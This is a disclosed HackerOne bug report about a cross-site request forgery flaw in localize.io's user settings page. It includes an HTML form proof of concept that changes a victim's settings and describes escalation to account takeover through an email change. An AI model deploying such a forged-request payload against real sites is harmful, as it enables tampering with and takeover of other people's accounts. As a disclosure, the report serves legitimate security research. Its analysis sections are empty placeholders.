---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '7870'
original_report_id: '7870'
title: Change user settings through CSRF
weakness: Cross-Site Request Forgery (CSRF)
team_handle: localize
created_at: '2014-04-17T18:24:49.454Z'
disclosed_at: '2014-05-18T00:02:35.282Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Change user settings through CSRF

## Metadata

- HackerOne Report ID: 7870
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: localize
- Disclosed At: 2014-05-18T00:02:35.282Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,

it's trivial to change the user settings. Just use  this HTML code:

<html>
<head></head>
<body>
<form action="http://www.localize.io/pages/settings" method="post">
<input type="text" name="settings[realName]" value="otherusername">
<input type="submit" value="Submit">
</form>
</body>
</html>

In addition with some Javascript code that submits the form automatically, making the user visit the snipped of code above will change their user settings. If their e-mail address is altered too, and the adversary gets a verification e-mail after he changes the user's e-mail to his e-mail, it's easy to take over an account.

I also recommend enabling HTTPS and disallowing regular HTTP.

Greets

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
